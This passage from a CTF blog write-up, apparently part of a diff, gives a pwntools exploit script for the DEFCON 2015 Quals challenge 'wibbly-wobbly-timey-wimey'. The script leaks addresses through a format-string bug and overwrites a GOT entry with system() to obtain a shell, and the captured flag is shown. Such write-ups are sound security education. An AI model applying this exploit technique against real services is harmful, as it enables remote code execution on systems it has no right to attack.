class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">ip = <span class="string">"wwtw_c3722e23150e1d5abbc1c248d99d718d.quals.shallweplayaga.me"</span></span><br><span class="line">port = <span class="number">2606</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getMap</span><span class="params">(s)</span>:</span></span><br><span class="line">	MAP=s</span><br><span class="line">	MAP=MAP[:len(MAP)<span class="number">-24</span>]</span><br><span class="line">	<span class="keyword">print</span> MAP</span><br><span class="line">	MAP=MAP[len(MAP)<span class="number">-479</span>:]</span><br><span class="line">	sql=MAP.split(<span class="string">'\n'</span>)</span><br><span class="line">	i=<span class="number">0</span></span><br><span class="line">	res = [[] <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">20</span>)] </span><br><span class="line">	<span class="keyword">for</span> l <span class="keyword">in</span> sql:</span><br><span class="line">		l = l[<span class="number">3</span>:]</span><br><span class="line">		res[i]=l</span><br><span class="line">		i+=<span class="number">1</span> </span><br><span class="line">	<span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getChar</span><span class="params">(c,MAP)</span>:</span></span><br><span class="line">	x=<span class="number">0</span></span><br><span class="line">	y=<span class="number">0</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> MAP:</span><br><span class="line">		<span class="keyword">for</span> j <span class="keyword">in</span> i:</span><br><span class="line">			<span class="keyword">for</span> a <span class="keyword">in</span> c:</span><br><span class="line">				<span class="keyword">if</span> j == a:</span><br><span class="line">					<span class="keyword">return</span> (y,x)</span><br><span class="line">			y+=<span class="number">1</span></span><br><span class="line">		x+=<span class="number">1</span></span><br><span class="line">		y=<span class="number">0</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="number">-1</span>,<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">t = remote(ip, port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># start playing the game</span></span><br><span class="line"><span class="keyword">for</span> test <span class="keyword">in</span> range(<span class="number">1000</span>):</span><br><span class="line">	s = t.readuntil(<span class="string">": "</span>)</span><br><span class="line">	<span class="keyword">if</span> <span class="string">"KEY"</span> <span class="keyword">in</span> s:</span><br><span class="line">		<span class="keyword">print</span> s</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	MAP = getMap(s)</span><br><span class="line">	GOAL=(<span class="number">-1</span>,<span class="number">-1</span>)</span><br><span class="line">	ME=(<span class="number">-1</span>,<span class="number">-1</span>)</span><br><span class="line">	GOAL=getChar([<span class="string">'E'</span>,<span class="string">'T'</span>],MAP)</span><br><span class="line">	<span class="keyword">print</span> GOAL</span><br><span class="line">	ME=getChar([<span class="string">'&lt;'</span>,<span class="string">'&gt;'</span>,<span class="string">'V'</span>,<span class="string">'^'</span>],MAP)</span><br><span class="line">	<span class="keyword">print</span> ME</span><br><span class="line"></span><br><span class="line">	drct = []</span><br><span class="line">	<span class="keyword">if</span>( ME[<span class="number">0</span>] - GOAL[<span class="number">0</span>] &gt; <span class="number">0</span> ):</span><br><span class="line">		<span class="keyword">if</span>( ME[<span class="number">0</span>] &gt; <span class="number">0</span> <span class="keyword">and</span> MAP[ME[<span class="number">1</span>]][ME[<span class="number">0</span>]<span class="number">-1</span>] !=<span class="string">'A'</span>):</span><br><span class="line">			drct+=<span class="string">'a'</span></span><br><span class="line">	<span class="keyword">elif</span>( ME[<span class="number">0</span>] - GOAL[<span class="number">0</span>] &lt; <span class="number">0</span> ):</span><br><span class="line">		<span class="keyword">if</span>( ME[<span class="number">0</span>] &lt; <span class="number">19</span> <span class="keyword">and</span> MAP[ME[<span class="number">1</span>]][ME[<span class="number">0</span>]+<span class="number">1</span>] !=<span class="string">'A'</span>):</span><br><span class="line">			drct+=<span class="string">'d'</span></span><br><span class="line">	<span class="keyword">if</span>( ME[<span class="number">1</span>] - GOAL[<span class="number">1</span>] &gt; <span class="number">0</span> ):</span><br><span class="line">		<span class="keyword">if</span>( ME[<span class="number">1</span>] &gt; <span class="number">0</span> <span class="keyword">and</span> MAP[ME[<span class="number">1</span>]<span class="number">-1</span>][ME[<span class="number">0</span>]] !=<span class="string">'A'</span>):</span><br><span class="line">			drct+=<span class="string">'w'</span></span><br><span class="line">	<span class="keyword">elif</span>( ME[<span class="number">1</span>] - GOAL[<span class="number">1</span>] &lt; <span class="number">0</span> ):</span><br><span class="line">		<span class="keyword">if</span>( ME[<span class="number">1</span>] &lt; <span class="number">19</span> <span class="keyword">and</span> MAP[ME[<span class="number">1</span>]+<span class="number">1</span>][ME[<span class="number">0</span>]] !=<span class="string">'A'</span>):</span><br><span class="line">			drct+=<span class="string">'s'</span></span><br><span class="line">	<span class="keyword">if</span> drct == [] :</span><br><span class="line">		<span class="keyword">if</span> ME[<span class="number">0</span>] == GOAL[<span class="number">0</span>] :</span><br><span class="line">			<span class="keyword">if</span> ME[<span class="number">0</span>] &gt; <span class="number">0</span> :</span><br><span class="line">				drct+=<span class="string">'a'</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				drct+=<span class="string">'d'</span></span><br><span class="line">		<span class="keyword">elif</span> ME[<span class="number">1</span>] == GOAL[<span class="number">1</span>] :</span><br><span class="line">			<span class="keyword">if</span> ME[<span class="number">1</span>] &gt; <span class="number">0</span> :</span><br><span class="line">				drct+=<span class="string">'w'</span></span><br><span class="line">			<span class="keyword">else</span>:</span><br><span class="line">				drct+=<span class="string">'s'</span></span><br><span class="line">			</span><br><span class="line">	<span class="keyword">print</span> drct</span><br><span class="line">	t.send(drct[<span class="number">0</span>]+<span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Done playing, time to send TARDIS KEY</span></span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"sending tardis key..."</span>)</span><br><span class="line">t.send(<span class="string">"UeSlhCAGEp\n"</span>)</span><br><span class="line"><span class="keyword">print</span> t.recvuntil(<span class="string">"Selection: "</span>)</span><br><span class="line">log.info(<span class="string">"overwriting fd..."</span>)</span><br><span class="line">t.send(<span class="string">"11111111\x00\n"</span>)</span><br><span class="line"><span class="keyword">print</span> t.recvuntil(<span class="string">"Selection: "</span>)</span><br><span class="line">time.sleep(<span class="number">2</span>) <span class="comment"># wait for 2 second so the service's able to call sub_BCB()</span></span><br><span class="line">log.info(<span class="string">"enable choice 3..."</span>)</span><br><span class="line">t.send(<span class="string">"m+YU\n"</span>) <span class="comment"># m+YU = 1431907181</span></span><br><span class="line">t.send(<span class="string">"1\n"</span>) <span class="comment"># turn on the TARDIS console</span></span><br><span class="line"><span class="keyword">print</span> t.recvuntil(<span class="string">"Selection: "</span>)</span><br><span class="line">log.info(<span class="string">"writing fd back..."</span>)</span><br><span class="line">t.send(<span class="string">"11111111\x03\n"</span>) <span class="comment"># write the fd back to 3 so the rest of our input won't get into sub_BCB()</span></span><br><span class="line"><span class="keyword">print</span> t.recvuntil(<span class="string">"Selection: "</span>)</span><br><span class="line">t.sendline(<span class="string">"3"</span>)</span><br><span class="line">t.recvuntil(<span class="string">"Coordinates: "</span>)</span><br><span class="line">log.success(<span class="string">"choice 3 enabled success"</span>)</span><br><span class="line"></span><br><span class="line">x = <span class="number">51.492137</span></span><br><span class="line">y = <span class="number">-0.192878</span></span><br><span class="line">pass_xy = str(x)+<span class="string">','</span>+str(y)</span><br><span class="line"></span><br><span class="line">payload = pass_xy</span><br><span class="line"></span><br><span class="line"><span class="comment"># constructing format string payload</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">    a = <span class="string">".%"</span>+str(i)+<span class="string">"$p"</span></span><br><span class="line">    payload += a</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"sending payload..."</span>)</span><br><span class="line">t.sendline(payload)</span><br><span class="line">s = t.recvuntil(<span class="string">"Coordinates: "</span>)</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line">nptr = int(s.split(<span class="string">"."</span>)[<span class="number">13</span>], <span class="number">16</span>) <span class="comment"># get the stack address</span></span><br><span class="line">ret_addr = nptr + <span class="number">0x406</span> <span class="comment"># return address' location</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">"nptr: "</span>+ hex(nptr))</span><br><span class="line">log.success(<span class="string">"ret: "</span>+ hex(ret_addr))</span><br><span class="line"></span><br><span class="line">payload = pass_xy</span><br><span class="line">payload += <span class="string">"A"</span> <span class="comment"># padding</span></span><br><span class="line">payload += p32(ret_addr)</span><br><span class="line">payload += <span class="string">".%20$p"</span></span><br><span class="line">payload += <span class="string">".%20$s."</span> <span class="comment"># leak the return address</span></span><br><span class="line">t.sendline(payload)</span><br><span class="line"></span><br><span class="line">s = t.recvuntil(<span class="string">"Coordinates: "</span>)</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line">WTF = u32(s.split(<span class="string">"."</span>)[<span class="number">6</span>]) <span class="comment"># return address</span></span><br><span class="line">text_base = WTF - <span class="number">0x1491</span></span><br><span class="line">atof_got = text_base + <span class="number">0x5080</span></span><br><span class="line">log.success(<span class="string">"text_base: "</span>+ hex(text_base))</span><br><span class="line">log.success(<span class="string">"atof_got: "</span>+ hex(atof_got))</span><br><span class="line"></span><br><span class="line">payload = pass_xy</span><br><span class="line">payload += <span class="string">"A"</span></span><br><span class="line">payload += p32(atof_got)</span><br><span class="line">payload += <span class="string">".%20$p"</span></span><br><span class="line">payload += <span class="string">".%20$s."</span>  <span class="comment"># leak atof's got</span></span><br><span class="line">t.sendline(payload)</span><br><span class="line"></span><br><span class="line">s = t.recvuntil(<span class="string">"Coordinates: "</span>)</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line">atof_addr = u32(s.split(<span class="string">"."</span>)[<span class="number">6</span>][<span class="number">0</span>:<span class="number">4</span>])</span><br><span class="line">system_addr = atof_addr + <span class="number">59728</span></span><br><span class="line">log.success(<span class="string">"atof addres: "</span>+ hex(atof_addr))</span><br><span class="line">log.success(<span class="string">"system addres: "</span>+ hex(system_addr))</span><br><span class="line"></span><br><span class="line">byte1 = system_addr &amp; <span class="number">0xFF</span></span><br><span class="line">byte2 = (system_addr &amp; <span class="number">0xFFFF00</span>) &gt;&gt; <span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># use %n to overwrite atof's got entry into system's address</span></span><br><span class="line">fmt1 = byte1 - <span class="number">28</span></span><br><span class="line">fmt2 = byte2 - fmt1 - <span class="number">28</span></span><br><span class="line">payload = pass_xy</span><br><span class="line">payload += <span class="string">"A"</span></span><br><span class="line">payload += p32(atof_got)</span><br><span class="line">payload += p32(atof_got+<span class="number">1</span>)</span><br><span class="line">payload += <span class="string">"%"</span>+str(fmt1)+<span class="string">"c"</span>+<span class="string">"%20$hhn"</span></span><br><span class="line">payload += <span class="string">"%"</span>+str(fmt2)+<span class="string">"c%21$hn"</span></span><br><span class="line">t.sendline(payload)</span><br><span class="line">s = t.recvuntil(<span class="string">"Coordinates: "</span>)</span><br><span class="line"><span class="keyword">print</span> s</span><br><span class="line"></span><br><span class="line">t.interactive()</span><br><span class="line"><span class="comment"># send cat /home/wwtw/flag;,123 to get flag</span></span><br></pre></td></tr></table></figure>
+<p>Flag: <code>Would you like a Jelly Baby? !@()*ASF)9UW$askjal</code></p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+            <a href="/tags/Pwnable/" rel="tag"># Pwnable</a>
+          
+            <a href="/tags/Python/" rel="tag"># Python</a>
+          
+            <a href="/tags/PPC/" rel="tag"># PPC</a>
+          
+            <a href="/tags/C/" rel="tag"># C</a>
+          
+            <a href="/tags/format-string/" rel="tag"># format_string</a>
+          
+            <a href="/tags/DEFCON/" rel="tag"># DEFCON</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2015/05/23/2015-05-23-defcon-ctf-2015-quals-mathwhiz/" rel="next" title="DEFCON CTF 2015 Quals -- mathwhiz">
+                <i class="fa fa-chevron-left"></i> DEFCON CTF 2015 Quals -- mathwhiz
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2015/08/06/2015-08-06-ais3-2015-pre-exam-complete-writeup/" rel="prev" title="AIS3 2015 pre-exam -- complete writeup">
+                AIS3 2015 pre-exam -- complete writeup <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- Go to www.addthis.com/dashboard to customize your tools -->
+<div class="addthis_inline_share_toolbox">
+  <script type = "text/javascript" src = "//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-592d8051fa91b8b6" async = "async" ></script>
+</div>
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview sidebar-panel sidebar-panel-active">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="https://s.gravatar.com/avatar/ff4140457527a5c7d307793a9ec905e0?s=80"
+               alt="Bruce Chen" />
+          <p class="site-author-name" itemprop="name">Bruce Chen</p>
+           
+              <p class="site-description motion-element" itemprop="description">Security researcher / CTFer / Pwner</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">50</span>
+                <span class="site-state-item-name">posts</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">2</span>
+                <span class="site-state-item-name">categories</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">61</span>
+                <span class="site-state-item-name">tags</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/bruce30262" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/bruce30262" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.facebook.com/bruce.chen.102" target="_blank" title="Facebook">
+                  
+                    <i class="fa fa-fw fa-facebook"></i>
+                  
+                  Facebook
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+          <div class="cc-license motion-element" itemprop="license">
+            <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" target="_blank">
+              <img src="/images/cc-by-nc-sa.svg" alt="Creative Commons" />
+            </a>
+          </div>
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2017 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Bruce Chen</span>
+</div>
+
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="https://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      Total visitors
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      Total views
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://bruce30262logdown.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://bruce30262.github.io/2015/05/23/2015-05-23-defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/';
+          this.page.identifier = '2015/05/23/2015-05-23-defcon-ctf-2015-quals-wibbly-wobbly-timey-wimey/';
+          this.page.title = 'DEFCON CTF 2015 Quals -- wibbly-wobbly-timey-wimey';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://bruce30262logdown.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
